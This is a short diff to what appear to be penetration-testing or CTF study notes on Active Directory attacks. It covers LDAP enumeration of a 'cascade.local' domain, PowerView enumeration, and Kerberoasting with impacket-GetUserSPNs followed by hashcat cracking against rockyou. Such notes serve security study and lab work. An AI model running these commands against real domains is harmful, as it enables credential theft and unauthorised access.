@@ -48,10 +48,10 @@ ldapsearch -h <IP> -x -b “DC=cascade,DC=local” ‘(objectClass=person)’
 ## After initial shell, credentials or some password
 1. Enumerate the initial target using powerview. Trasfer file to target.
 2. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
-## Kerbreroasting
+## Kerbreroasting (Service account)
 1. Once we have creds, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
 ```
-impacket-GetUserSPNs <IP or hostname>/<username>:<password> [add -request if SPN is found]
+impacket-GetUserSPNs <IP or hostname>/<username>:<password> -request [add -request if SPN is found]
 [save hash and crack with hashcat]
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
